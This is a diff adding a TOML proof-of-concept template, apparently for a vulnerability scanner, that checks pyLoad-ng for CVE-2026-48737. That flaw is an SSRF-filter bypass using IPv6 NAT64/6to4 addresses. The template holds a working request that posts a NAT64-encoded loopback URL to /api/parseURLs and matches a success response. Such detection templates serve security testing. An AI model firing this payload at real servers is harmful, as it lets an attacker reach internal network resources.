@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "检测 pyLoad-ng SSRF 防护绕过漏洞，通过 IPv6 NAT64/6to4 转换地址绕过 is_global_address 检查，使攻击者可访问内部网络资源"
+id = "POC-AVE-2026-0301"
+name = "CVE-2026-48737 PoC"
+severity = "medium"
+tags = ["cve-2026-48737"]
+vuln_id = [
+    "CVE-2026-48737",
+    "AVE-2026-0301",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/parseURLs"
+protocol = "http"
+
+[poc.requests.body]
+content = "urls=http://[64:ff9b::7f00:1]/&package_id=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"added"',
+    "success",
+]
